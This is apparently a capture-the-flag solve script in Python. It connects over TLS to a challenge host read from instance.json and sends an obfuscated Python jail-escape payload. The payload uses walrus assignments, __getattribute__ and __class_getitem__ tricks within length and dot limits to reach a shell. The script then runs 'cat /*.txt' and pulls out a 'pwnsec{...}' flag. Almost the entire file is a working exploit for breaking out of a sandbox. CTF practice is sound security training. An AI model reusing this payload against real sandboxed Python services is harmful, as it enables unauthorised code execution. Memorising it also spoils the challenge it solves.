import json
import re
import socket
import ssl
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent
FLAG_RE = re.compile(rb"pwnsec\{[^}\r\n]+\}")
PAYLOAD = r"""{False:{T:=True,F:=T-T,X:=hint_A,z:=T+T,q:=z*z,m:=q+z,p:=q*z,n:=p*z,h:=hint_B,f:=lambda x:x.__getattribute__,a:=X,i:=F},T:{_:{F:{a:=X[a][F]if i==m+T else X[a],f:=B}if i in{q,m+T,p+T,p+q}else X[a]if i>p+m else{f:=X[a][J],a:=Q}if i==p+z+T else{f:=X[a][S],a:=X[C]}if i==m else{f:=X[a],a:={z+T:C,q+T:D,p:R,p+z:I,p+q+T:Y,p+m:W}[i]}if i>z else{B:=X[a],f:=B,a:=X}if i>T else{F:{U:=u+k,K:=U+g+e+t+U,C:=U+x+h[q]+h[z]+L+L+U,S:=U+L+w+b+C[z:-z]+e+L+U,D:=U+r[m]+j+x+t+U,R:=v+e+g+j+L+t+e+v,I:=U+b+w+j+h[q]+t+j+h[m]+L+U,J:=U+j+r[T]+h[p]+h[p+q]+v+t+U,Q:=h[p+q]+L,Y:=L+h[p+T]+L+t+e+r[T],W:=L+h[p+z+T],f:=E,a:=K}for E in{X[a]}for r in{h[:z+T:z]%E}for u,k,g,e,t,j,b,w,L,x,v in{r[n+T:n+m]+r[n+p+z:n+p+q+T]+r[n+n+n:n+n+n+z]+r[p+T]}}if i else{a:=X[a]},T:{i:=i+T}}for _ in h+h[:z]for X.__class_getitem__ in{f}}}"""


def recv_until(sock: ssl.SSLSocket, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise RuntimeError(f"connection closed before {marker!r}")
        data += chunk
    return data


def main() -> int:
    try:
        if len(PAYLOAD) > 800 or PAYLOAD.count(".") > 2:
            raise RuntimeError("payload violates the jail limits")
        config = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
        endpoint = config["endpoints"][0]
        raw = socket.create_connection((endpoint["host"], endpoint["port"]), timeout=15)
        with ssl.create_default_context().wrap_socket(
            raw, server_hostname=endpoint["host"]
        ) as sock:
            sock.settimeout(20)
            recv_until(sock, b"~ ")
            sock.sendall(PAYLOAD.encode("ascii") + b"\n")
            received = recv_until(sock, b"# ")
            sock.sendall(b"cat /*.txt\nexit\n")
            while True:
                match = FLAG_RE.search(received)
                if match:
                    sys.stdout.buffer.write(match.group(0))
                    return 0
                chunk = sock.recv(4096)
                if not chunk:
                    break
                received += chunk
        raise RuntimeError("flag not found in service response")
    except Exception as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
